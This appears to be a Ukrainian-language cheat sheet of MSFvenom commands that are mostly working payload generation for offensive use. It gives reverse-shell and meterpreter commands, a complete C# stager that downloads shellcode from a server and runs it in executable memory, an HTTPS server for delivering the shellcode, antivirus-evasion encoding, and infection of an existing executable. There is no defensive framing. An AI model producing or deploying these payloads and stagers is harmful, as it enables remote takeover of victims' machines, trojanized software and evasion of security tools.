
# Команди MSFvenom

Цей документ містить список основних команд MSFvenom з поясненнями українською мовою для ефективної роботи з інструментом.

## Основні команди

1. **-p**  
   Вказує тип payload для створення шкідливого файлу.  
   **Приклад**:  
   ```bash
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf > payload.elf
   ```
   або `windows/x64/shell/reverse_tcp` для staged і `windows/x64/shell_reverse_tcp` для stageless payload.

#### Для `staged` flow, спочатку потрібно створити shellcode, який буде завантажувати бінарний файл із сервера.

Створюємо бінарний файл:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
```
Створюємо `staged` payload файл який при виконанні буде підключатися до сервера та завантажувати shellcode:

```
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    string url = "https://192.168.1.1/shellcode.bin";
    Stager(url);
  }

  public static void Stager(string url)
  {

    WebClient wc = new WebClient();
    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

    byte[] shellcode = wc.DownloadData(url);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```
Скомпілювати `.cs` код щоб отримати `.exe` який завантажить `shellcode.bin`: 
```
csc shellcode.cs
```

Перед завантаженням створити https сервер із якого буде завантажуватись наш shellcode.bin
```
openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
```
```
python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
```

2. **-f**  
   Вказує формат файлу, який буде створений. Може бути elf, exe, asp, php, і багато інших.  
   **Приклад**:  
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe > payload.exe
   ```

3. **-a, --arch**  
   Вказує архітектуру цільової системи (x86, x64, arm).  
   **Приклад**:  
   ```bash
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf -a x86 > payload.elf
   ```

4. **-b**  
   Вказує символи, яких слід уникати в payload, щоб не порушити працюючі процеси або системи.  
   **Приклад**:  
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -b "\00" -f exe > payload.exe
   ```

5. **-e**  
   Вказує енкодер для захисту payload. Це дозволяє приховати payload від антивірусів.  
   **Приклад**:  
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe
   ```

6. **-x**  
   Вказує шлях до існуючого виконуваного файлу для його зараження.  
   **Приклад**:  
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -x /path/to/existing.exe -f exe > infected.exe
   ```

7. **-i**  
   Вказує кількість ітерацій енкодера, щоб зробити payload важче для детектування.  
   **Приклад**:  
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > payload.exe
   ```

8. **-l**  
   Виводить список всіх доступних payloads.  
   **Приклад**:  
   ```bash
   msfvenom -l
   ```

10. **-h**  
    Виводить довідку про використання MSFvenom та його параметри.  
    **Приклад**:  
    ```bash
    msfvenom -h
    ```

11. **--platform**  
    Вказує платформу для payload (наприклад, Windows, Linux, Android).  
    **Приклад**:  
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 --platform windows -f exe > payload.exe
    ```

13. **--payload**  
    Вказує конкретний payload для генерації.  
    **Приклад**:  
    ```bash
    msfvenom --payload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe > payload.exe
    ```

15. **-o**  
    Вказує ім’я файлу, у який буде збережено payload.  
    **Приклад**:  
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -o payload.exe
    ```


